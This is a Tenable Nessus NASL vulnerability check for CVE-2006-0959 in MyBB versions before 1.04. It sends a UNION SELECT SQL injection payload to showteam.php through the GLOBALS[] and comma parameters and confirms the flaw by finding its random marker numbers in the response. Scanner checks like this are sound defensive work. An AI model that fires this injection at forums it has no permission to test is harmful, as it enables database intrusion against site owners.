#
# (C) Tenable Network Security
#


include("compat.inc");

if (description) {
  script_id(20930);
  script_version("$Revision: 1.10 $");

  script_cve_id("CVE-2006-0959");
  script_bugtraq_id(16631);
  script_xref(name:"OSVDB", value:"23554");

  script_name(english:"MyBB < 1.04 Multiple Vulnerabilities");
  script_summary(english:"Checks for multiple vulnerabilities in MyBB < 1.04");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is susceptible
to multiple attacks." );
 script_set_attribute(attribute:"description", value:
"The installed version of MyBB fails to validate user input to a large
number of parameters and scripts before using it in database queries
and dynamically-generated web pages.  If PHP's 'register_globals'
setting is enabled, an unauthenticated attacker may be able to
leverage these issues to conduct SQL injection and cross-site
scripting attacks against the affected application." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/424942/30/0/threaded" );
 script_set_attribute(attribute:"see_also", value:"http://community.mybboard.net/showthread.php?tid=6777" );
 script_set_attribute(attribute:"see_also", value:"http://community.mybboard.net/showthread.php?tid=7368" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to MyBB version 1.1.0 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2009 Tenable Network Security, Inc.");

  script_dependencies("mybb_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


magic1 = rand();
magic2 = rand();
exploit = string("%20UNION%20SELECT%20", magic1, ",", magic2);
for (i=1; i<=57; i++) exploit += ",null";
exploit += ",1,4--";


# Test an install.
install = get_kb_item(string("www/", port, "/mybb"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  dir = matches[2];

  # Try to exploit flaw.
  w = http_send_recv3(method:"GET",
    item:string(
      dir, "/showteam.php?",
      "GLOBALS[]=1&",
       "comma=-2)", exploit
    ), 
    port:port
  );
  if (isnull(w)) exit(1, "the web server did not answer");
  res = w[2];

  # There's a problem if we see our magic numbers in the response.
  if (
    string("&amp;uid=", magic1, '">') >< res &&
    string("<b><i>", magic2, "</i></b>") >< res
  ) {
    security_hole(port);
      set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
      set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
    exit(0);
  }
}
